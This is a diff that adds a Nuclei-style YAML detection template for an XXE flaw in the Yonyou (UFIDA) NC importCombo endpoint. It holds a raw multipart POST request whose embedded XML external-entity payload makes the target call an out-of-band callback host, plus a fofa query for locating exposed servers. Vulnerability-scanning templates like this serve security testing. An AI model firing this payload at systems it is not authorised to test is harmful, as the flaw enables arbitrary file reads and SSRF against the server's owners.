@@ -1,0 +1,34 @@
+id: yongyouNC-importCombo-XXE
+
+info:
+  name: 用友NC importCombo XXE漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: app="用友-UFIDA-NC"
+    用友NC importCombo 接口处存在XML实体注入漏洞，攻击者可利用xxe漏洞获取服务器敏感数据，可读取任意文件以及ssrf攻击，存在一定的安全隐患。
+  reference:
+    - https://mp.weixin.qq.com/s/_a_iDUzZ5fukOib-I9T93g
+  tags: XXE
+
+http:
+  - raw:
+      - |
+        POST /portal/pt/portalcombo/importCombo?pageId=login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3LEPfAt3B386AN3f
+
+        ------WebKitFormBoundary3LEPfAt3B386AN3f
+        Content-Disposition: form-data; name="file"; filename="1.png"
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [
+        <!ENTITY % remote SYSTEM "http://{{interactsh-url}}/">
+        %remote;]>
+        <root/>
+        ------WebKitFormBoundary3LEPfAt3B386AN3f--
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+        - "dns"
